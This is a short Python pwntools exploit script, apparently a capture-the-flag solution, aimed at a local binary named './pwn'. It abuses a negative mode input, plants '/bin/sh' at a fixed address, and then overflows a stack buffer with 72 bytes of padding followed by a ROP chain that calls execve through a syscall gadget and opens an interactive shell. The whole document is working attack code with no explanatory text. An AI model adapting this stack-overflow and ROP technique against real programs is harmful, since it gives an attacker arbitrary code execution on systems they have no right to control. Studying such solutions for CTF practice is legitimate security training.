from pwn import *
p = process('./pwn')
#p = remote('127.0.0.1',42537)
context(arch='amd64', os='linux', log_level='debug')
p.sendlineafter(b'choose mode',b'-32')
bin_add = 0x404084
payload1 = flat([
    p32(59),
    b'/bin/sh\x00'
])
p.sendafter(b'Input your password',payload1)
syscall = 0x401230
gadget = 0x40123c
prax = 0x401244
payload2 = flat([
    b'A' * 72,
    prax, 59,
    gadget, bin_add, 0, 0,
    syscall
])
p.sendafter(b'Developer Mode.\n',payload2)
p.interactive()